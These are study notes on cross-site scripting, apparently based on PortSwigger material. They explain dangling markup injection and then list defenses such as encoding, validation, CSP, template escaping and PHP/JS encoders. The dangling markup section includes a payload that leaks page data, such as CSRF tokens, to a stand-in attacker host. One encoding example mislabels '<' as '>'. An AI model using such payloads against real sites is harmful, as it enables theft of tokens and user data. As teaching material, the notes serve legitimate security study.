# CROSS-SITE SCRIPTING
## Dangling Markup Injection
> Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible due to input filters or other defenses.
- It can often be exploited to capture sensitive information that is visible to others including CSRF tokens that can be used to perform unauthorized actions on behald of the user.
- Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
```
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```
- If the application doesn't filter or escape the `>` or `"` characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:
```
">
```
- If regular XSS attack is not possible, due to input filters, CSP or other obstacles, it might still be possible to deliver a dangling markup injection attack using a payload as below:
```
"><img src='//attackerwebsite.com?
```
- This payload creates an `img` tag and defines the start of a `src` attribute containing a URL on the attacker's server. The `src` attribute is left **dangling**.
- When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute and everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string.
- Any non-alphanumeric characters, including newlines will be `URL-encoded`.
- The attacker can capture part of the application's response following the injection point, which might contain sensitive data that may include CSRF tokens, email messages or financial data.

### How to prevent dangling markup attacks
- Dangling markup attacks can be prevented using the same general defenses for preventing XSS by encoding data on output and validating input on arrival.

--------------------------------------------------------------------------------

## Preventing XSS attacks
- Preventing XSS is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.
- Effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:
1. `Validate input on arival`
- At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
- Encoding is probably the most important line of XSS defense but is not sufficient to prevent XSS vulnerabilities in every context.
- Validate input as strictly as possible at the point when it is first received from a user.
- Input validation includes:
  a. If user submits a URL that will be returned in responses, validating that it starts with a safe protocol such as HTTP and HTTPS otherwise someone might exploit the site with harmful protocol like javascript.
  b. If a user supplies a value that it expected to be numeric, validating that the value actually contains an integer.
  c. Validating that input contains only an expected set of characters.

2. `Encode data on output`
- At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. This might require applying combinations of HTML, URL, JS and CSS encoding.
- Should be applied directly before user-controllable data is written to a page, because the context being written into determines what kind of encoding you need to use.
- In an HTML context, you should convert non-whitelisted values into HTML entities:
    - `<` converts to: `&lt;`
    - `>` converts to: `&gt;`
- In a JS string context, non-alphanumeric values should be **Unicode-escaped**:
    - `>` converts to: `\u003c`
    - `>` converts to: `\u003e`
- Sometimes apply multiple layers of encoding in the correct order such as to safely embed user input inside an event handler, you need to deal with both JS context and HTML context.
- So you need to first `Unicode-escape` the input and then `HTML-encode it`:
```
<a href="#" onclick="x='this string needs two layers of escaping'">test</a>
```

3. `Whitelisting vs Blacklisting`
- Input validation should employ **whitelists** rather than **blacklists** as this will ensure your defense doesn't break when new harmful protocols appear and make it less susceptible to attacks that seek to obfuscate invalid values to evade a blacklist.

4. `Allowing "safe" HTML`
- Allowing users to post HTML markup should be avoided wherever possible but sometimes its a business requirement. Eg a blog site might allow comments to be posted containing some limited HTML markup.
- Classic approach is to try to filter out potentially harmful tags and JS.
- You can try implement this using a whitelist of safe tags and attributes but with discrepancies in browser parsing engines and quirks like mutation XSS, this approach is extremely difficult to implement securely.

5. `Use appropriate response headers`
- To prevent XSS in HTTP responses that aren't intended to contain any HTML, JS, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.

6. `Content Security Policy`
- As last line of defense, use CSP to reduce the severity of any XSS that still occur.
- CSP lets you control various things such as whether external scripts can be loaded and whether inline scripts will be executed.
- An example CSP is as follows:
```
default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```
- This policy specifies that resources such as images and scripts can only be loaded from the same origin as the main page. So even if an attacker can successfully inject an XSS payload they can only load resources from the current origin. 

7. `Preventing XSS using a template engine`
- Many modern websites use server-side template engines such as `Twig` and `Freemarker` to embed dynamic content in HTML.
- These typically define their own escaping system. Eg in Twig you can use the`e()` filter with an argument defining the context:
```
{{ user.firstname | e('html') }}
```
- Other template engines such as Jinja and React, escape dynamic content by default which effectively prevents most occurrences of XSS.

8. `Preventing XSS in PHP`
- In PHP there is a built-in function to encode entities called `htmlentities` call this function to escape your input when inside an HTML context. Function should be called with 3 arguments:
    a. Your input string.
    b. `ENT_QUOTES`, which is a flag that specifies all quotes should be encoded.
    c. The character set, which in most cases should be UTF-8
- Eg:
```
<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?>
```
- When in a JS string context, Unicode-escape input as described. Unfortunately, PHP doesn't provide an API to Unicode-escape a string. 
- Here is how to use the jsEscape function in PHP:
```
<script>x= '<?php echo jsEscape($_GET['x'])?>'</script>
```

9. `Preventing XSS client-side in JS`
- To escape user input in an HTML context in JS, you need your own HTML encoder because JS doesn't provide an API to encode HTML.
- Example of JS code that converts a string to HTML entities:
```
function htmlEncode(str){
  return String(str).replace(/[^\w. ]/gi, function(c){
    return '&#'+c.charCodeAt(0)+';';
  });
}
```
You would then use this function as follows:
```
<script>document.body.innerHTML=htmlEncode(untrustedValue)</script>
```
If your input is inside a JS string, you need an encoder that performs Unicode escaping as below:
```
function jsEscape(str){
  return String(str).replace(/[^\w. ]/gi, function(c){
    return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
  });
}
```
You would then use this function as follows:
```
<script>document.write('<script>x="'+jsEscape(untrustedValue)+'";</script>')</script>
```

10. `Preventing XSS in jQuery`
- Most common form of XSS in jQuery is when you pass user input to a jQuery selector.
- Web developers often use `location.hash` and pass it to the selector which would cause XSS as jQuery would render in the HTML.
- jQuery recognized this issue and patched their selector logic to check if input begins with a hash.
- jQuery will only render HTML if the first character is a `<`. If you pass untrusted data to the jQuery selector, ensure you correctly escape the value using the `jsEscape` function.


--------------------------------------------------------------------------------
# MATERIALS
## Referencing
- [PortSwigger](https://portswigger.net/web-security/cross-site-scripting)
- [Dangling Markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)
- [Preventing XSS](https://portswigger.net/web-security/cross-site-scripting/preventing)
- [Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities](https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities#badcss)

## Labs
- [Reflected XSS protected by CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-with-dangling-markup-attack)
- [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)
